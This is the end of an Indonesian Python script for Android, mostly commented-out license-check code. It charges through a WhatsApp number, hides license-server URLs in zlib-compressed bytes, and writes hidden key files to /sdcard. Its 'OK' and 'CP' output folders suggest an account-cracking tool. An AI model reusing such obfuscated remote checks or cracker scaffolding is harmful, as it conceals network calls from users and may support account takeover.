#               nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
#                os.system('clear')
#               banner()
#                linex()
#               cetak(f" [[cyan]?[/]] [bold white] Lisensi Anda Belum Disetujui")
#                cetak(f" [[cyan]?[/]] [bold white] Silahkan Chat Ke Admin Untuk Menyetujui Lisensi anda")
#                linex()
#                cetak(f" [[green]![/]] [bold white] Key Lisensi Anda      : [bold green]%s"%(nr))
 #               cetak(f" [[green]![/]] [bold white] Copy Key Anda Kirimkan Kepada Admin Untuk Disetujui ")
#                cetak(f" [[green]![/]] [bold white] Kontak WhatsApp Admin : [bold green]+6283145020179 ")
#                linex()
#                cetak(panel(f"""       [white] [[green]![/]] [bold white] 1 Minggu : 40.000 [[green]![/]] [bold white] 1 Bulan : 100.000\n 
#[[bold red]![/]][bold green] Lisensi Key Mingguan Hanya Berlaku Untuk 1 Device Saja[/]\n[[bold red]![/]][bold green] Untuk Perbulan Bisa Request Maksimal 2 Device Untuk 1 Key""",width=70,title=f"[white]• PRICELIST •",style=f"{color_table}"))
#                linex()
 #               subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=6283145020179&text=%s"%(nr)])
#                exit()
 #       except(IOError):
 #               basex = str(random.randint(1,9999999))
  #              open("/sdcard/Android/media/.libr-cpq","w").write(basex)
 #               os.system("chmod 777 /sdcard/Android/media/.libr-cpq")
  #              genkey()

#ERROR BYPASSING
#def keyx():
#        os.system("touch /sdcard/.key")
#        os.system("rm -rf /sdcard/.key")
#        try:
#                basex = open("/sdcard/Android/media/.libr-cpq","r").read()
#        except(KeyError, IOError):
#                genkey()
#        try:
#                zl = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd77-\xb5(-\xd3OM\xc9,\x01\x00\x95\xfc\nA')
#                rq = requests.get(zl).text
#       except requests.exceptions.ConnectionError:
#               print('%s BAD INTERNET CONNECTION'%(P))
#                exit()
#        basex1 = basex.encode('ascii')
#        basex2 = base64.b64encode(basex1)
#        basex3 = basex2.decode('ascii')
#        base4 = (basex3).upper()
#        nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
#        if nr in rq:
#               pass
#        else:
#                genkey()
#def Line_():
#    try:
#        zl = zlib.decompress(b'x\x9ce\xcb1\n\x800\x0c\x00\xc0\x1f%\xbb\xab\xe0?j\x13\xda\x80MJ\x9aR\xf4\xf5.n\xae\x07W#\xfa\xd8\x10=-(\x12u\x9es\xb0g\xd3`\r\xc8\xd6p\xafR\xec\x11^\xe6\x17-!\xfe\xcb7A\x0c[\x12\xc5\xc3\x85\x95\xa0\xdf/\xce\xd6${')
#       r =requests.get(zl).text
#        if "Yes" in r:
#           Code_()
#        else:
#            cetak(f"Lisensi Kadaluarsa Silahkan Chat Admin Untuk Konfirmasi Ulang Lisensi")
#            exit()
#    except requests.exceptions.ConnectionError:
#       print('%s\n BAD INTERNET CONNECTION \n'%(P))
#        exit()
                
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	Code_()

#>>>>> THANKS TO THIS HERE <<<<<<<#
